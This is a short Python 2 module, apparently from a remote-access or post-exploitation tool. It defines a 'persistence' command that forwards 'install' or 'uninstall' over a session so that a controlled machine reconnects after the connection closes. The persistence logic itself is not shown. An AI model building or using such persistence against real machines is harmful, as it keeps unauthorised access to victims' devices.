import modules.helper as h

class command:
    def __init__(self):
        self.name = "persistence"
        self.description = "attempts to re establish connection after close"

    def run(self,session,cmd_data):
        if cmd_data['args'] == "install":
            h.info_general("Installing...")
        elif cmd_data['args'] == "uninstall":
            h.info_general("Uninstalling...")
        else:
            print "Usage: persistence install|uninstall"
            return
        session.send_command(cmd_data)